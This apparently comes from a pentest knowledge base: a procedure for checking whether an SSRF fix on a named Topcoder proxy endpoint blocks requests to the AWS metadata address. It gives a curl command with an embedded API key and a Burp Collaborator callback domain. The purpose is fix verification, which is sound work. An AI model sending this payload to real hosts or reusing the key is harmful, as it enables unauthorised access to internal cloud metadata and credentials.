---
id: proc-uuid-3
tags:
  - ssrf
  - vulnerability-testing
  - fix-verification
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/test-ssrf-fix-metadata-access]]'
verified: false
platforms:
  - Web
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:46.130Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-SSRF-Fix-Effectiveness-with-Metadata-Request

## Summary

This procedure tests the effectiveness of a reported SSRF fix by re-attempting an internal metadata request to the proxy endpoint, expecting a block to confirm mitigation.

## Description

After disclosure, the endpoint was patched, but this step verifies if arbitrary internal URLs are now denied. Using a simplified request to the base 169.254.169.254 endpoint with Collaborator for OOB, a 403 response indicates successful blocking. This helps assess if the fix is complete or if bypasses remain. Prerequisites: Access to the updated application.

## Requirements

1. Burp Suite Repeater for request replay
2. Same API key as initial exploitation
3. Updated target application post-fix

## Defense

Defensive measures and detection strategies:

- Enforce URL validation rejecting private IP ranges
- Conduct post-fix penetration testing
- Use automated scanners like Nuclei for SSRF templates
- Review application logs for repeated failed internal requests

## Objectives

1. Confirm SSRF requests to internal endpoints are blocked
2. Identify any remaining bypass paths
3. Validate fix for disclosure closure

## Instructions

### Step 1: Craft Post-Fix Request

**Context**: Send a request targeting the base AWS metadata URL to test blocking.

**Command** ([[commands/test-ssrf-fix-metadata-access]]):
```bash
curl -X POST "https://cognitive.topcoder.com/community-app-assets/api/proxy-post" \
  -H "Authorization: ApiKey 130edef6-2289-4407-bfcf-3eedacebb860" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http%3A%2F%2F169.254.169.254&EMAIL=eviltwin%404w15ul5vh79meeab3xqz2jk45vbpze.burpcollaborator.net"
```

> Expect 403 Forbidden if fixed; otherwise, vulnerability persists.

### Step 2: Analyze Response and OOB

**Context**: Check for denial and lack of Collaborator interactions.

No command; inspect response.

> Success if no metadata returned and no callbacks.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/test-ssrf-fix-metadata-access]]

## Tools Used

- [[tools/Burp-Suite]]
- [[tools/Burp-Collaborator]]

## Tags

- ssrf-fix
- testing
